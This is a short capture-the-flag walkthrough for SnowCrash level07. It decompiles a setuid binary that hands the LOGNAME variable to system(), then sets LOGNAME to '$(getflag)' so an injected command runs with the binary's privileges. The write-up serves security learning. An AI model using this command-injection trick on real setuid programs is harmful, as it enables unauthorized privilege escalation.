## 1. Connect to level07:

```bash
level06@SnowCrash:~$ su level07
password: *use previously found flag*
```

## 2. See existing files:

```bash
level07@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

## 3. Locally download the file (on local computer terminal, not VM):

```bash
level07@SnowCrash:~$ scp -P 4242 level07@<your VM's IP address>:/home/user/level07/level07 ~
```

## 4. Use *`Ghidra`* application to convert file into readable code
Once open, look to the left, *Symbol Tree* > *Functions* > *main*
Look at the main and find:
```bash
pcVar1 = getenv("LOGNAME");
asprintf(&local_1c,"/bin/echo %s ",pcVar1);
iVar2 = system(local_1c);
```

## 5. Change LOGNAME value in `env`
```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
```

## 6. Execute `level07` to obtain flag
```bash
level07@SnowCrash:~$ ./level07
```
